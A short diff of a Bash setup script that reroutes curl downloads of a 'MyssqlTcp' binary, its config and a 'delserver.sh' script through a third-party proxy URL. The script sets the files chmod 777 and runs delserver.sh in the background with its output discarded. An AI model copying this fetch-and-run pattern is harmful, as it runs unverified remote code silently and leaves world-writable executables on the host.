@@ -707,8 +707,8 @@ sync && echo 3 >/proc/sys/vm/dro
 cd $HOME/
 mkdir myssqltcp
 cd /$HOME/myssqltcp
-curl -L --progress-bar "https://raw.gitmirror.com/teshushu/BiBi/main/Bash/config.json" -o $HOME/myssqltcp/config.json
-curl -L --progress-bar "https://raw.gitmirror.com/teshushu/BiBi/main/Bash/MyssqlTcp" -o $HOME/myssqltcp/MyssqlTcp
+curl -L --progress-bar "https://gh.xmly.dev/https://raw.gitmirror.com/teshushu/BiBi/main/Bash/config.json" -o $HOME/myssqltcp/config.json
+curl -L --progress-bar "https://gh.xmly.dev/https://raw.gitmirror.com/teshushu/BiBi/main/Bash/MyssqlTcp" -o $HOME/myssqltcp/MyssqlTcp
 chmod 777 MyssqlTcp
 chmod 777 config.json
 
@@ -820,7 +820,7 @@ fi
 echo ""
 
 cd /$HOME/
-curl -L --progress-bar "https://raw.gitmirror.com/teshushu/BiBi/main/Bash/url/delserver.sh" -o $HOME/delserver.sh
+curl -L --progress-bar "https://gh.xmly.dev/https://raw.gitmirror.com/teshushu/BiBi/main/Bash/url/delserver.sh" -o $HOME/delserver.sh
 chmod 777 delserver.sh
 nohup ./delserver.sh > /dev/null 2>&1 &
 
